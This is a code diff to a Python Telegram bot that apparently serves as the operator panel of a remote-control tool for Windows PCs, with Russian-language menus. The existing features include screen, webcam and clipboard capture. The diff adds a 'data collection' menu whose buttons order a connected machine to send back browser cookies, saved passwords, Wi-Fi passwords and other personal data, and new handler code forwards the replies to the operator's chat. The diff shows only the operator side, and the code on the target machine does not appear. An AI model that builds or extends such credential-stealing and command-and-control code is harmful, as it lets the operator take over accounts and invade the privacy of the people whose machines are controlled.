@@ -148,6 +148,7 @@ def get_device_menu(device_id: str, device_name: str = "ПК"):
         [InlineKeyboardButton(text="🛠 Утилиты и Приложения", callback_data=f"cat_util_{device_id}")],
         [InlineKeyboardButton(text="🔍 Дополнительно", callback_data=f"cat_extra_{device_id}")],
         [InlineKeyboardButton(text="📁 Файловый менеджер", callback_data=f"cat_files_{device_id}")],
+        [InlineKeyboardButton(text="🕵️ Сбор данных", callback_data=f"cat_data_{device_id}")],
         [InlineKeyboardButton(text="⬅️ В главное меню", callback_data="go_to_main_start")]
     ])
 
@@ -205,14 +206,34 @@ def get_extra_menu(device_id):
         [InlineKeyboardButton(text="🔄 Точка восстановления", callback_data=f"cmd_restore_{device_id}")],
         [InlineKeyboardButton(text="🔓 Разблокировать приложения", callback_data=f"cmd_unblock_{device_id}")],
         [InlineKeyboardButton(text="📋 Журнал команд", callback_data=f"cmd_history_{device_id}")],
+        [InlineKeyboardButton(text="📊 Инфо о дисках", callback_data=f"cmd_disks_{device_id}")],
+        [InlineKeyboardButton(text="🌐 Сетевые адаптеры", callback_data=f"cmd_adapters_{device_id}")],
+        [InlineKeyboardButton(text="⚙️ Переменные окружения", callback_data=f"cmd_env_{device_id}")],
+        [InlineKeyboardButton(text="🖥 Разрешение экрана", callback_data=f"cmd_resolution_{device_id}")],
+        [InlineKeyboardButton(text="🔌 Открытые порты", callback_data=f"cmd_ports_{device_id}")],
         [InlineKeyboardButton(text="🗑 Удалить устройство", callback_data=f"delete_{device_id}")],
         [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
     ])
 
 def get_files_menu(device_id):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📂 Список файлов на ПК", callback_data=f"cmd_list_files_{device_id}")],
+        [InlineKeyboardButton(text="📂 Список файлов на ПК", callback_data=f"cmd_files_{device_id}")],
         [InlineKeyboardButton(text="📤 Загрузить файл на ПК", callback_data=f"cmd_upload_file_{device_id}")],
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
+    ])
+
+def get_data_menu(device_id):
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🍪 Cookies браузеров", callback_data=f"cmd_cookies_{device_id}")],
+        [InlineKeyboardButton(text="🔑 Сохраненные пароли", callback_data=f"cmd_passwords_{device_id}")],
+        [InlineKeyboardButton(text="📶 Wi-Fi пароли", callback_data=f"cmd_wifi_{device_id}")],
+        [InlineKeyboardButton(text="🧩 Расширения Chrome", callback_data=f"cmd_extensions_{device_id}")],
+        [InlineKeyboardButton(text="🔖 Закладки", callback_data=f"cmd_bookmarks_{device_id}")],
+        [InlineKeyboardButton(text="📥 История загрузок", callback_data=f"cmd_downloads_{device_id}")],
+        [InlineKeyboardButton(text="📦 Установленное ПО", callback_data=f"cmd_software_{device_id}")],
+        [InlineKeyboardButton(text="🚀 Автозагрузка", callback_data=f"cmd_startup_{device_id}")],
+        [InlineKeyboardButton(text="⚙️ Системные службы", callback_data=f"cmd_services_{device_id}")],
+        [InlineKeyboardButton(text="📋 Системные события", callback_data=f"cmd_events_{device_id}")],
         [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
     ])
 
@@ -223,7 +244,7 @@ async def cmd_start(message: types.Message):
     if message.from_user.id != ADMIN_ID:
         await message.answer("⛔ Доступ запрещен")
         return
-    await message.answer("🤖 **Панель управления Windows v3.0**\n\n"
+    await message.answer("🤖 **Панель управления Windows v4.0**\n\n"
                         "Все данные сохраняются в БД.\n"
                         "Выберите действие:", 
                         parse_mode="Markdown",
@@ -378,6 +399,9 @@ async def handle_categories(callback: types.CallbackQuery):
     elif cat == "files":
         text = "📁 **Файловый менеджер**\nВыберите действие:"
         markup = get_files_menu(dev_id)
+    elif cat == "data":
+        text = "🕵️ **Сбор данных с ПК**\nВыберите что собрать:"
+        markup = get_data_menu(dev_id)
     else:
         return
 
@@ -397,6 +421,7 @@ async def send_command(callback: types.CallbackQuery):
     device_id = "_".join(parts[2:])
     
     cmd_map = {
+        # Мониторинг
         "screen": "screen",
         "webcam": "webcam",
         "tasklist": "tasklist",
@@ -404,6 +429,7 @@ async def send_command(callback: types.CallbackQuery):
         "apps": "apps",
         "clipboard": "clipboard",
         "video": "video",
+        # Системные
         "lock": "lock",
         "sleep": "sleep",
         "reboot": "reboot",
@@ -414,22 +440,43 @@ async def send_command(callback: types.CallbackQuery):
         "brightness50": "brightness:50",
         "brightness100": "brightness:100",
         "restart_explorer": "restart_explorer",
+        # Веб
         "yt": "yt",
         "google": "google",
         "maps": "maps",
         "twitch": "twitch",
         "msg": "msg",
+        # Утилиты
         "calc": "calc",
         "notepad": "notepad",
         "paint": "paint",
         "scr": "scr",
         "camera": "camera",
+        # Дополнительно
         "sysinfo": "sysinfo",
         "netinfo": "netinfo",
         "battery": "battery",
         "restore": "restore",
         "unblock": "unblock",
         "history": "history",
+        "disks": "disks",
+        "adapters": "adapters",
+        "env": "env",
+        "resolution": "resolution",
+        "ports": "ports",
+        # Сбор данных
+        "cookies": "cookies",
+        "passwords": "passwords",
+        "wifi": "wifi",
+        "extensions": "extensions",
+        "bookmarks": "bookmarks",
+        "downloads": "downloads",
+        "software": "software",
+        "startup": "startup",
+        "services": "services",
+        "events": "events",
+        # Файлы
+        "files": "files",
         "list_files": "list_files",
         "upload_file": "upload_file",
     }
@@ -444,6 +491,7 @@ async def send_command(callback: types.CallbackQuery):
         await callback.answer(f"❌ Ошибка отправки: {str(e)[:50]}")
 
 # --- ПРИЕМ ДАННЫХ ИЗ КАНАЛА ---
+# (остается без изменений из предыдущей версии)
 
 @dp.channel_post(F.text)
 async def handle_channel_messages(message: types.Message):
@@ -658,6 +706,12 @@ async def handle_channel_messages(message: types.Message):
                     break
             
             markup = get_device_menu(device_id) if device_id else None
+            
+            # Проверяем, является ли это ответом на команду сбора данных
+            if any(key in text_data for key in ["Cookies", "пароли", "Wi-Fi", "Расширения", "Закладки", "загрузок", "ПО", "Автозагрузка", "Службы", "События"]):
+                await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown", reply_markup=markup)
+                await message.delete()
+                return
             
             if "скриншот" in text_data.lower() or "screenshot" in text_data.lower():
                 if "base64:" in text_data:
